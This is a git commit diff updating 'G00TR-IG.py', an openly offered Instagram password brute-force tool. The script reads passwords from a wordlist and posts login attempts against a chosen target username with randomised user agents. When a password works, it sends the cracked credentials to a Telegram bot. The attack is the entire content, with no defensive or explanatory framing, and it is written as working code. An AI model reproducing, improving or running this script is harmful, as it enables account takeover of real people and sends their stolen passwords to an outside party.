99f3144a31562ac9c71275127fc05ba0b62fa913
TLER AL-BISHI <111729973+tlersa@users.noreply.github.com>
2023-04-01 23:24:27 +0300

    Update G00TR-IG.py

--- G00TR-IG.py
+++ G00TR-IG.py
@@ -1,6 +1,5 @@
 import requests, random, pyfiglet
 from user_agent import generate_user_agent
-from time import sleep
 
 #--------------------------------
 Black = "\033[1;30m"       #Black
@@ -10,7 +9,7 @@ Yellow = "\033[1;33m"      #Yellow
 Blue = "\033[1;34m"        #Blue
 Purple = "\033[1;35m"      #Purple
 Cyan = "\033[1;36m"        #Cyan
-White =" \033[1;37m"       #White
+White = "\033[1;37m"       #White
 Gray = "\033[1;39m"        #Gray
 DarkRed = "\033[2;31m"     #Dark Red
 DarkBlue = "\033[2;34m"    #Drak Blue
@@ -20,23 +19,31 @@ DarkCyan = "\033[2;36m"    #Dark Cyan
 
 logo = pyfiglet.figlet_format("G00TR-IG")
 print(Blue+logo)
+print("\033[1;37mThis Tool Was Programmed By : TLER AL-BISHI \nWebsite For All Accs : \033[1;34mhttps://linktr.ee/tler.sa")
+print("\033[1;37m- "*25)
 
-ID = input("[+] - Enter Your ID : ")
-token = input("[+] - Enter Your Token BOT : ")
+option  = input("Do You Want To Send Info To The Telegram? \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m) \033[1;33m")
+if option == "Y":
+    ID = input("\033[1;37m[\033[1;33m1\033[1;37m] - \033[1;31mEnter Your ID \033[1;37m: \033[1;31m")
+    token = input("\033[1;37m[\033[1;33m2\033[1;37m] - \033[1;31mEnter Your Token BOT \033[1;37m: \033[1;31m")
+
+if option == "N":
+    print("\033[1;37mNo Problem \033[1;34m:) \033[1;37m...")
+
+else:
+    print("\033[1;31mPlease Choose \033[1;37m(\033[1;33mY\033[1;37m/\033[1;33mN\033[1;37m)!")
 
 r = requests.Session()
 
-file = input(Cyan+"[+] - Enter Name File : ")
-rfile = open(file, "r")
-us = input(Red+"[+] - Enter Username Target : ")
-def check():
-    while True:
-        username = us
-        password = rfile.readline().split('\n')[0]
-        time.sleep(5)
+filee = input("\033[1;37m[\033[1;36m+\033[1;37m] - \033[1;36mEnter Name File \033[1;37m: \033[1;36m")
+rfile = open(filee, "r")
+us = input("\033[1;37m[\033[1;33m+\033[1;37m] - \033[1;31mEnter Username Target \033[1;37m: \033[1;31m")
+
+while True:
+    username = us
+    password = rfile.readline().split("\n")[0]
 
     url = 'https://www.instagram.com/accounts/login/ajax/'
-  
     headers = {'accept':'*/*',
          'accept-encoding':'gzip,deflate,br',
          'accept-language':'en-US,en;q=0.9,ar;q=0.8',
@@ -48,24 +55,24 @@ def check():
          'sec-fetch-dest':'empty',
          'sec-fetch-mode':'cors',
          'sec-fetch-site':'same-origin',
-         'user-agent':generate_user_agent(),
+         'user-agent': generate_user_agent(),
          'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
          'x-ig-app-id':'936619743392459',
          'x-ig-www-claim':'0',
          'x-instagram-ajax':'8a8118fa7d40',
          'x-requested-with':'XMLHttpRequest'}         
-         
-    data = {'username':username,
-         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
-         'queryParams':'{}',
-         'optIntoOneTap':'false'}
+    data = {
+        'username': username,
+        'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
+        'queryParams':'{}',
+        'optIntoOneTap':'false'}
+    req_login = r.post(url, headers=headers, data=data, proxies=None)
 
-    req_login = r.post(url,headers=headers, data=data, proxies=None)
-
-    if "userid" in req_login.text:
-        print(Green+"User name : "+username, Green+"Password : "+password)
-        tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={G}''')
+    if 'userId' in req_login.text:
+        print("\033[1;32mUser name \033[1;37m: \033[1;31m"+username+"\n\033[1;32mPassword \033[1;37m: \033[1;31m"+password)
+        tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={username}{password}')
         i = requests.post(tlg)
+        break
 
     else:
-        print(Red+"Error : =password")
+        print("\033[1;31mError \033[1;37m: \033[1;31m"+password)
